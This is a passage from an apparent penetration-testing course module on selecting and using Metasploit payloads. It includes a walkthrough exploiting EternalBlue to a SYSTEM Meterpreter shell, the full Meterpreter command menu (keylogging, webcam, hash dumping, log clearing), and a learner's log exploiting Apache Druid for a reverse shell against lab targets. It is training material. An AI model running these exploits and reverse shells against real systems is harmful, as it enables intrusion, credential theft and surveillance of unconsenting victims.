   527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64
```

As we can see, it can be pretty time-consuming to find the desired payload with such an extensive list. We can also use `grep` in `msfconsole` to filter out specific terms. This would speed up the search and, therefore, our selection.

We have to enter the `grep` command with the corresponding parameter at the beginning and then the command in which the filtering should happen. For example, let us assume that we want to have a `TCP` based `reverse shell` handled by `Meterpreter` for our exploit. Accordingly, we can first search for all results that contain the word `Meterpreter` in the payloads.

#### MSF - Searching for Specific Payload

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)


msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```

This gives us a total of `14` results. Now we can add another `grep` command after the first one and search for `reverse_tcp`.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

With the help of `grep`, we reduced the list of payloads we wanted down to fewer. Of course, the `grep` command can be used for all other commands. All we need to know is what we are looking for.

## Selecting Payloads

Same as with the module, we need the index number of the entry we would like to use. To set the payload for the currently selected module, we use `set payload <no.>` only after selecting an Exploit module to begin with.

#### MSF - Select Payload

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

After selecting a payload, we will have more options available to us.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

As we can see, by running the `show payloads` command within the Exploit module itself, msfconsole has detected that the target is a Windows machine, and such only displayed the payloads aimed at Windows operating systems.

We can also see that a new option field has appeared, directly related to what the payload parameters will contain. We will be focusing on `LHOST` and `LPORT` (our attacker IP and the desired port for reverse connection initialization). Of course, if the attack fails, we can always use a different port and relaunch the attack.

## Using Payloads

Time to set our parameters for both the Exploit module and the payload module. For the Exploit part, we will need to set the following:

|**Parameter**|**Description**|
|---|---|
|`RHOSTS`|The IP address of the remote host, the target machine.|
|`RPORT`|Does not require a change, just a check that we are on port 445, where SMB is running.|

For the payload part, we will need to set the following:

|**Parameter**|**Description**|
|---|---|
|`LHOST`|The host's IP address, the attacker's machine.|
|`LPORT`|Does not require a change, just a check that the port is not already in use.|

If we want to check our LHOST IP address quickly, we can always call the `ifconfig` command directly from the msfconsole menu.

#### MSF - Exploit and Payload Configuration

```shell-session
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig

**[\*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>


msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

Then, we can run the exploit and see what it returns. Check out the differences in the output below:

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > whoami

[-] Unknown command: whoami.


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

The prompt is not a Windows command-line one but a `Meterpreter` prompt. The `whoami` command, typically used for Windows, does not work here. Instead, we can use the Linux equivalent of `getuid`. Exploring the `help` menu gives us further insight into what Meterpreter payloads are capable of.

#### MSF - Meterpreter Commands

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of Unicode strings
    enable_unicode_encoding   Enables encoding of Unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    IRB                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Strap: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    LCD           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    PWD           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Strap: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    get proxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of hostnames on the target
    route         View and modify the routing table


Strap: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Strap: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idle time       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real-time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Strap: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    get system     Attempt to elevate your privilege to that of the local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestamp Commands
========================

    Command       Description
    -------       -----------
    timestamp     Manipulate file MACE attributes
```

Pretty nifty. From extracting user hashes from SAM to taking screenshots and activating webcams. All of this is done from the comfort of a Linux-style command line. Exploring further, we also see the option to open a shell channel. This will place us in the actual Windows command-line interface.

#### MSF - Meterpreter Navigation

```shell-session
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris


meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

`Channel 1` has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage. The stager was activated on our machine to await a connection request initialized by the Stage payload on the target machine.

Moving into a standard shell on the target is helpful in some cases, but Meterpreter can also navigate and perform actions on the victim machine. So we see that the commands have changed, but we have the same privilege level within the system.

#### MSF - Windows CMD

```shell-session
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

whoami
nt authority\system
```

Let's see what other types of payloads we can use. We will be looking at the most common ones related to Windows operating systems.

## Payload Types

The table below contains the most common payloads used for Windows machines and their respective descriptions.

|**Payload**|**Description**|
|---|---|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|

Other critical payloads that are heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads. These are not in the scope of this course, but feel free to research them in our free time as they can provide a significant amount of insight into how professional penetration testers perform their assessments on high-value targets.

Besides these, of course, there are a plethora of other payloads out there. Some are for specific device vendors, such as Cisco, Apple, or PLCs. Some we can generate ourselves using `msfvenom`. However, next up, we will look at `Encoders` and how they can be used to influence the attack outcome.

---

## Questions

Answer the question(s) below to complete the section

Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
```
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> search druid

Matching Modules
================

   #   Name                                            Disclosure Date  Rank       Check  Description
   -   ----                                            ---------------  ----       -----  -----------
   0   exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
   1     \_ target: Linux (dropper)                    .                .          .      .
   2     \_ target: Unix (in-memory)                   .                .          .      .
   3   exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
   4     \_ target: Automatic                          .                .          .      .
   5     \_ target: Windows                            .                .          .      .
   6     \_ target: Linux                              .                .          .      .
   7   auxiliary/spoof/dns/bailiwicked_domain          2008-07-21       normal     Yes    DNS BailiWicked Domain Attack
   8   auxiliary/spoof/dns/bailiwicked_host            2008-07-21       normal     Yes    DNS BailiWicked Host Attack
   9   auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
   10    \_ AKA: Log4Shell                             .                .          .      .
   11    \_ AKA: LogJam                                .                .          .      .
   12  exploit/solaris/sunrpc/ypupdated_exec           1994-12-12       excellent  No     Solaris ypupdated Command Execution
   13  exploit/solaris/dialup/manyargs                 2001-12-12       good       No     System V Derived /bin/login Extraneous Arguments Buffer Overflow
   14  auxiliary/scanner/telephony/wardial             .                normal     No     Wardialer


Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/telephony/wardial

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info

       Name: Apache Druid 0.20.0 Remote Command Execution
     Module: exploit/linux/http/apache_druid_js_rce
   Platform: Linux, Unix
       Arch: x86, x64, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-21

Provided by:
  Litch1, Security Team of Alibaba Cloud
  je5442804

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Linux (dropper)
      1   Unix (in-memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                        ort][...]. Supported proxies: sapni, socks4, http,
                                        socks5, socks5h
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
                                        /docs/using-metasploit/basics/using-metasploit.html
  RPORT      8888             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is random
                                        ly generated)
  TARGETURI  /                yes       The base path of Apache Druid
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                      s must be an address on the local machine or 0.0.0.0
                                      to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
  various types of requests; however, that feature is disabled by default.

  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
  that both enables the JavaScript code-execution feature and executes the supplied code all
  at once, allowing for code execution on the server with the privileges of the Druid Server process.
  More critically, authentication is not enabled in Apache Druid by default.

  Tested on the following Apache Druid versions:

  * 0.15.1
  * 0.16.0-iap8
  * 0.17.1
  * 0.18.0-iap3
  * 0.19.0-iap7
  * 0.20.0-iap4.1
  * 0.20.0
  * 0.21.0-iap3

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info

       Name: Apache Druid 0.20.0 Remote Command Execution
     Module: exploit/linux/http/apache_druid_js_rce
   Platform: Linux, Unix
       Arch: x86, x64, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-21

Provided by:
  Litch1, Security Team of Alibaba Cloud
  je5442804

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Linux (dropper)
      1   Unix (in-memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                        ort][...]. Supported proxies: sapni, socks4, http,
                                        socks5, socks5h
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
                                        /docs/using-metasploit/basics/using-metasploit.html
  RPORT      8888             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is random
                                        ly generated)
  TARGETURI  /                yes       The base path of Apache Druid
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                      s must be an address on the local machine or 0.0.0.0
                                      to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
  various types of requests; however, that feature is disabled by default.

  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
  that both enables the JavaScript code-execution feature and executes the supplied code all
  at once, allowing for code execution on the server with the privileges of the Druid Server process.
  More critically, authentication is not enabled in Apache Druid by default.

  Tested on the following Apache Druid versions:

  * 0.15.1
  * 0.16.0-iap8
  * 0.17.1
  * 0.18.0-iap3
  * 0.19.0-iap7
  * 0.20.0-iap4.1
  * 0.20.0
  * 0.21.0-iap3

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set LHOST 10.10.14.4
LHOST => 10.10.14.4
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set RHOSTS 10.129.203.52
RHOSTS => 10.129.203.52
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
[-] Exploit failed: windows/meterpreter/reverse_tcp is not a compatible payload.
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info

       Name: Apache Druid 0.20.0 Remote Command Execution
     Module: exploit/linux/http/apache_druid_js_rce
   Platform: Linux, Unix
       Arch: x86, x64, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-21

Provided by:
  Litch1, Security Team of Alibaba Cloud
  je5442804

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Linux (dropper)
      1   Unix (in-memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                        ort][...]. Supported proxies: sapni, socks4, http,
                                        socks5, socks5h
  RHOSTS     10.129.203.52    yes       The target host(s), see https://docs.metasploit.com
                                        /docs/using-metasploit/basics/using-metasploit.html
  RPORT      8888             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is random
                                        ly generated)
  TARGETURI  /                yes       The base path of Apache Druid
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                      s must be an address on the local machine or 0.0.0.0
                                      to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
  various types of requests; however, that feature is disabled by default.

  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
  that both enables the JavaScript code-execution feature and executes the supplied code all
  at once, allowing for code execution on the server with the privileges of the Druid Server process.
  More critically, authentication is not enabled in Apache Druid by default.

  Tested on the following Apache Druid versions:

  * 0.15.1
  * 0.16.0-iap8
  * 0.17.1
  * 0.18.0-iap3
  * 0.19.0-iap7
  * 0.20.0-iap4.1
  * 0.20.0
  * 0.21.0-iap3

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Using URL: http://10.10.14.4:8080/3mSWWqB
[*] Client 10.129.203.52 (curl/7.68.0) requested /3mSWWqB
[*] Sending payload to 10.129.203.52 (curl/7.68.0)
[*] Sending stage (3090404 bytes) to 10.129.203.52
[*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.129.203.52:52644) at 2026-05-27 14:37:24 -0400
[*] Command Stager progress - 100.00% done (110/110 bytes)
[*] Server stopped.

(Meterpreter 2)(/root/druid) > ps | head
Filtering on 'head'
